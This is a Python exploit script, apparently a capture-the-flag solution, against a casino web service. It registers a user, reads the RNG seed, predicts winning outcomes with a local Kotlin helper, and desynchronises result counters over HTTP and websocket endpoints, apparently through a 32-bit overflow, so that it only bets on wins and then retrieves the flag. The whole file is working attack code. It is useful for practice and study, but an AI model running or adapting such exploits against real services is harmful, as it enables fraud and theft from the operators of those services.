#!/usr/bin/env python3

from typing import List

import os
import sys
import subprocess

import requests
import websocket


URL = sys.argv[1] if len(sys.argv) > 1 else 'localhost:7070'

STEP_SIZE = 10_000_000
INT_MAX_VALUE = 2147483647


def predict_random(seed: int, start: int, count: int) -> List[bool]:
    # os.system('kotlinc Seed.kt')

    process = subprocess.Popen(
        f'kotlin seed/SeedKt.class "{seed}" "{start}" "{count}"',
        stdin = subprocess.PIPE,
        stdout = subprocess.PIPE,
        stderr = subprocess.PIPE,
        shell = True,
    )

    stdout, _ = process.communicate()

    return [
        line.strip() == b'Win'
        for line in stdout.strip().splitlines()
    ]


def connect() -> requests.Session:
    url = f'http://{URL}/api/user/register'

    session = requests.Session()

    response = session.post(url)
    response.raise_for_status()

    return session


def balance(session: requests.Session) -> int:
    url = f'http://{URL}/api/user/balance'

    response = session.get(url)
    response.raise_for_status()

    return int(response.text)


def flag(session: requests.Session) -> str:
    url = f'http://{URL}/api/user/flag'

    response = session.get(url)
    # response.raise_for_status()

    return response.text


def initialize(session: requests.Session) -> int:
    url = f'http://{URL}/api/casino/initialize'

    response = session.post(url)
    response.raise_for_status()

    return int(response.text)


def guess(session: requests.Session, count: int) -> None:
    url = f'http://{URL}/api/casino/guess'

    response = session.post(url, data = str(count))
    response.raise_for_status()


def ws_connect(session: requests.Session) -> websocket.WebSocket:
    token = session.cookies['token']

    return websocket.create_connection(
        url = f'ws://{URL}/api/casino/results',
        cookie = f'token={token}',
    )


def results(ws_session: websocket.WebSocket, count: int) -> dict:
    ws_session.send(str(count))

    values = ws_session.recv()
    assert values != ''

    parts = values.split(', ')
    pairs = [part.split(': ') for part in parts]

    return {
        pairs[0][0]: int(pairs[0][1]),
        pairs[1][0]: int(pairs[1][1]),
        pairs[2][0]: int(pairs[2][1]),
    }


def emulate_synchronize(length: int) -> int:
    count = 0
    target = 2 * INT_MAX_VALUE + 2 - length

    consumed = 0

    for i in range(1 << 64):
        if i > 1:
            count += STEP_SIZE
            consumed += STEP_SIZE

        part = min(STEP_SIZE, target - count)
        count += part

        if count == target:
            break

    return consumed


def synchronize(session: requests.Session, length: int) -> None:
    count = 0
    target = 2 * INT_MAX_VALUE + 2 - length

    for i in range(1 << 64):
        if i > 1:
            ws_delete_sesson = ws_connect(session)
            results(ws_delete_sesson, STEP_SIZE)
            ws_delete_sesson.close()

            count += STEP_SIZE

            print(f'[sync] done {count} / {target}')

        part = min(STEP_SIZE, target - count)

        guess(session, part)
        count += part

        if count == target:
            break

    print('[sync] finished')


def find_win(seed: int, start: int, count: int = 1000) -> int:
    values = predict_random(seed, start, count)

    return values.index(True)


def skip_results(session: requests.Session, count: int) -> int:
    ws_session = ws_connect(session)
    values = results(ws_session, count)
    ws_session.close()

    return values['wins'] + values['losses']


def main() -> None:
    coins = 10

    session = connect()

    seed = initialize(session)
    print(f'seed: {seed}')

    ws_consume_session = ws_connect(session)

    start = 0

    for i in range(coins):
        print(f'balance: {i} / {coins}')

        size = 10_000

        skipped = skip_results(session, 1 << 28)
        synchronize(session, size + skipped)
        consumed = emulate_synchronize(size + skipped)
        start += consumed + skipped

        win_index = find_win(seed, start, size)
        skip_results(session, win_index)
        start += win_index

        guess(session, size - win_index)

        print(results(ws_consume_session, 1))
        start += 1

    ws_consume_session.close()

    print(f'balance: {balance(session)} / {coins}')
    print(f'flag: {flag(session)}')


if __name__ == '__main__':
    main()
